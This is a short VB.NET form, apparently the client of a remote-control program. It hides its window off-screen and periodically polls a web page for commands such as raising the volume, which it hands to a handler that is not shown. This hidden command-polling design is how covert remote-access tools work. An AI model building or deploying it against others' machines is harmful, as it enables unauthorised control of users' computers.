Public Class Form1
    'isLiPaiRemoteServerFile#incremental@0.019#target@ALL#cmdName@volumeinc#cmdReference@fucku^30#sdkVersion@0%%END
    Dim counter As Integer
    Dim docString As String
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Visible = False
        Me.Hide()
        Me.Left = -Me.Width
        Me.Top = -Me.Height
        If My.Settings.onevent = "NODATA" Then
            Dim inputString As String
            inputString = InputBox("SET THIS MACHINE'S TARGET", "INITIAL FOR LPRC")
            My.Settings.onevent = inputString
            My.Settings.Save()
        End If
        Timer1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable = False Then Exit Sub
        counter += 1
        If counter = 5 Then
            WebBrowser1.Refresh(WebBrowserRefreshOption.Completely)
            docString = New System.IO.StreamReader(WebBrowser1.DocumentStream, System.Text.Encoding.Default).ReadToEnd
            counter = 0
            If Split(docString, "%%")(0).Contains("isLiPaiRemoteServerFile") Then
                'updateCmd(srd.ReadToEnd)
                updateCmd(Split((docString), "%%")(0))
            Else
                Debug.Print("FAIL")
            End If
        End If
    End Sub

End Class
